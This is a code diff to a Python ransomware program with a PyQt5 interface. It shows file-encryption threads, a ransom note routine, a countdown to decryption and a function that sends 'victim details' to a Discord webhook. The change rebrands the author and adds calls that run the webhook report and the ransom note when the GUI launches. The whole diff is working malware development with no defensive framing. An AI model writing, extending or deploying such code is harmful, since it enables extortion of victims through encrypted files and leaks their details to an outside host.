@@ -115,6 +115,7 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
                         threading.Thread(target=self.encryptFile, args=(filepath,)).start()
 
         self.readMe()
+    
         '''
 
     # Send message to Discord Webhook with victim details 
@@ -134,7 +135,7 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
                         "url": "https://www.pngkit.com/png/full/168-1680567_69137579-pentagram-with-demon-baphomet-satanic-goat.png"
                     },
                     "author": {
-                        "name": "Scrypt",
+                        "name": "Hummus",
                         "icon_url": "https://i.imgur.com/F3j7z5K.png"
                     }
                 }
@@ -145,8 +146,7 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
         except Exception as e:
             print(f"Error sending message to Discord webhook: {e}")
     
-    
-
+        
     # Generate random string for encryption password
     def rSeed(self, stringLength):
         password_characters = string.ascii_letters
@@ -210,6 +210,10 @@ class RansomwareGUI(QMainWindow):
         self.startEncryptionProgress()
         self.startDecryptionCountdown()
 
+        ransomware_instance = Ransomware()
+        ransomware_instance.sendMessage()
+        ransomware_instance.readMe()
+        
     def initUI(self):
         # Create central widget
         central_widget = QWidget(self)
